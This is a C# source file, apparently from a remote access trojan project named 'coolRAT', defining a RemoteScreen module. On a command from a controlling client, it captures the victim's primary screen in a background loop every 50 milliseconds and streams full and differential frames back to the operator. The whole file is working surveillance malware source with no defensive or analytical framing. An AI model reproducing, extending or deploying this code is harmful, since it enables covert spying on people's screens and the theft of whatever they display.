using coolRAT.Libs.Connections;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace coolRAT.Libs
{
    public class RemoteScreen
    {
        public Client OwnerClient;
        public Thread FrameSenderThread;
        public Bitmap LastFrame;
        public Guid UniqueId;

        public RemoteScreen(Client ownerClient)
        {
            UniqueId = Guid.NewGuid();
            OwnerClient = ownerClient ?? throw new ArgumentNullException(nameof(ownerClient));
            LastFrame = null;
            OwnerClient.RegisterPacketHandler("ScreenCommandPacket", CommandReceiver_EventHandler);
        }

        public void SenderLoop()
        {
            while(true)
            {
                if(LastFrame == null)
                {
                    // Send a full frame
                    LastFrame = GetFullScreenshot();
                    ScreenFramePacket frame = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Full, LastFrame);
                    OwnerClient.SendPacket(frame);
                }
                else
                {
                    // Send a partial frame
                    Bitmap diff = GetPartialScreenshot();
                    LastFrame = ImageUtils.Diff2Vector(LastFrame, diff);
                    ScreenFramePacket frame = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Partial, diff);
                    OwnerClient.SendPacket(frame);
                }

                Thread.Sleep(50);
            }
        }

        public void Start()
        {
            if (FrameSenderThread != null) Stop();
            FrameSenderThread = new Thread(new ThreadStart(SenderLoop));
            FrameSenderThread.IsBackground = true;
            FrameSenderThread.Start();
        }

        public void Stop()
        {
            if (FrameSenderThread != null) if (FrameSenderThread.IsAlive) FrameSenderThread.Abort();
            FrameSenderThread = null;
        }

        public void Destroy()
        {
            OwnerClient.DeregisterPacketHandler("ScreenCommandPacket");
            Stop();
        }

        public void CommandReceiver_EventHandler(object sender, PacketReceivedEventArgs e)
        {
            if(e.Packet.Type == "ScreenCommandPacket")
            {
                ScreenCommandPacket screenCommandPacket = ScreenCommandPacket.Deserialize(e.RawPacket);
                if (screenCommandPacket.UniqueScreenId != UniqueId) return;
                switch(screenCommandPacket.CommandType)
                {
                    case CommandType.RequestFrame:
                        if(screenCommandPacket.Arguments == "Full")
                        {
                            LastFrame = GetFullScreenshot();
                            ScreenFramePacket screenFramePacket = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Full, LastFrame);
                            OwnerClient.SendPacket(screenFramePacket);
                            return;
                        }

                        if(screenCommandPacket.Arguments == "Partial")
                        {
                            ScreenFramePacket screenFramePacket;
                            if(LastFrame == null)
                            {
                                LastFrame = GetFullScreenshot();
                                screenFramePacket = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Full, LastFrame);
                                OwnerClient.SendPacket(screenFramePacket);
                                return;
                            }

                            Bitmap diff = GetPartialScreenshot();
                            LastFrame = ImageUtils.Diff2Vector(LastFrame, diff);
                            screenFramePacket = new ScreenFramePacket(OwnerClient.UniqueId, FrameType.Partial, diff);
                            OwnerClient.SendPacket(screenFramePacket);
                            return;
                        }
                        break;
                    case CommandType.SetState:
                        if (screenCommandPacket.Arguments == "Running")
                            Start();
                        else if (screenCommandPacket.Arguments == "Stopped")
                            Stop();
                        break;
                }
            }
        }

        public Bitmap GetFullScreenshot()
        {
            return (Bitmap)ImageUtils.ResizeImage(ImageUtils.TakeScreenshot(Screen.PrimaryScreen), new Size((int)Math.Round(Screen.PrimaryScreen.Bounds.Width * 0.7), (int)Math.Round(Screen.PrimaryScreen.Bounds.Height * 0.7)));
        }

        public Bitmap GetPartialScreenshot()
        {
            if (LastFrame == null) return null;
            return ImageUtils.Vector2Diff(LastFrame, GetFullScreenshot());
        }
    }
}
